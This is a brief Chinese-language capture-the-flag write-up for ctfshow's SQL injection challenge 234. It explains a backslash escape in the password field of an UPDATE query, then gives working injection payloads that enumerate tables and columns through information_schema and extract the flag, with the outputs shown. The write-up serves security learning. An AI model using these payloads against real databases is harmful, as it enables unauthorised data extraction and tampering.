# ctfshow-sql234



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```



 返回逻辑 

```
  //无过滤

```





```mysql
很遗憾单引号被过滤了，但是巅峰极客刚刚考过，用\实现逃逸
原来的语句是
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
但是传入单引号后
$sql = "update ctfshow_user set pass = '\' where username = 'username';";
这样pass里面的内容就是' where username =,接下来username里面的参数就是可以控制的了


mysql中不支持子查询更新，准确的说是更新的表不能在set和where中用于子查询。那串英文错误提示就是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。
update 同一个表注入方法
https://www.cnblogs.com/duanxz/p/5099030.html




# username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &password=\

banlist,banlist,ctfshow_user,ctfshow_user,ctfshow_user,flag23a,flag23a,flag23a


# username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)-- - &password=\
# username=,username=(select group_concat(column_name) from information_schema.columns where table_name=flag23a)-- - &password=\


id,flagass23s3,info

# username=,username=(select flagass23s3 from flag23a)-- - &password=\


ctfshow{00ad2fa0-34dd-463c-b430-2466157348bc}
```























